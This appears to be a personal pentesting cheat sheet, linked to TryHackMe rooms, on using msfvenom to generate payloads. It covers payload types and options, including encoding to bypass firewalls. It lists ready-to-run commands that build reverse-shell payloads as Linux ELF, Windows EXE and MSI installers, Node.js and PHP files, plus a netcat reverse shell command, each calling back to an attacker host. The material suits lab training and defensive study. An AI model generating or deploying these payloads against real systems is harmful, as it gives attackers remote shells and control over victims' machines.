# 🐍 msfvenom 🐍

[![introtoshells](../../../_badges/thmp/introtoshells.svg)](https://tryhackme.com/room/introtoshells)
[![metasploitexploitation](../../../_badges/thmp/metasploitexploitation.svg)](https://tryhackme.com/room/metasploitexploitation)

<div class="row row-cols-md-2"><div>

msfvenom is a tool of the [metasploit](../tools/metasploit.md) framework to generate payloads for reverse shells. We can customize payloads according to:

* 🎠 the program executing the payload <small>(PHP, python...)</small>
* 🏡 the target operating system
* 🛡️ the presence and configuration of a firewall
* 🔫️ the presence and configuration of an antivirus
* ...

```ps
$ msfvenom --list payloads
$ msfvenom --list payloads | grep meterpreter
```
</div><div>

msfvenom is often used with the [msfconsole](../tools/files/msf_handler.md) to catch them and pop a meterpreter shell <small>(see Metasploit framework, in short, an upgraded shell)</small>.

Metasploit separated **staged** payloads from **inline** payloads. The former is involving two steps: a simple payload <small>(called stage/stager)</small> is sent, which then request the rest of the payload. They are mainly used when there is a restriction on the size of the payload.

In Metasploit, the `_` is replaced with a `/` for staged payloads.

* `php/meterpreter_reverse_tcp`: inline/single
* `php/meterpreter/reverse_tcp`: staged
</div></div>

<hr class="sep-both">

## 🐸 Common options 🐸

<div class="row row-cols-md-2"><div>

**-p** to define the payload to use.

```ps
$ msfvenom -p cmd/unix/reverse_netcat [...]
```

**LHOST/LPORT** to define where the target will connect back.

```ps
$ msfvenom [...] LHOST=tun0 LPORT=4444
```

**-f** to define the format of the output. For instance, raw code.

```ps
$ msfvenom [...] -f raw
$ msfvenom [...] R # same for -f RAW
```
</div><div>

**-e** to define the encoding. It's mainly used to bypass firewall or reduce the size of the payload.

```ps
$ msfvenom [...] -e php/base64
```
</div></div>

<hr class="sep-both">

## 📌 Some payloads 📌

All examples are asking the target to connect back to `tun0` IP at the port `4444`.

<div class="row row-cols-md-2 mt-3"><div>

* **Linux** (.elf / ...)

```bash
# execute /bin/bash -p
$ msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o shell.elf
# Generate a .elf opening a reverse shell (TCP)
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f elf -o shell.elf
# Output a command (RAW) opening a reverse shell with netcat
$ msfvenom -p cmd/unix/reverse_netcat LHOST=tun0 LPORT=4444 -f raw
```

* **Windows** (.exe / .msi / ...)

```bash
# Generate a .exe opening a reverse shell (TCP)
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f exe -o shell.exe
# Generate a malicious installer (msi)
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f msi -o shell.msi
```
</div><div>

* **Node.js**

```bash
# Generate a .js opening a reverse shell (TCP)
$ msfvenom -p nodejs/shell_reverse_tcp LHOST=tun0 LPORT=4444 -o shell.js
```

* **PHP**

```bash
# very unstable shell, not recommended
$ msfvenom -p php/reverse_php LHOST=tun0 LPORT=4444 -o revshell.php
# meterpreter
$ msfvenom -p php/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -o revshell.php
```
</div></div>

<hr class="sep-both">

## 👻 To-do 👻

Stuff that I found, but never read/used yet.

<div class="row row-cols-md-2"><div>

* [old](_old.md)
</div><div>


</div></div>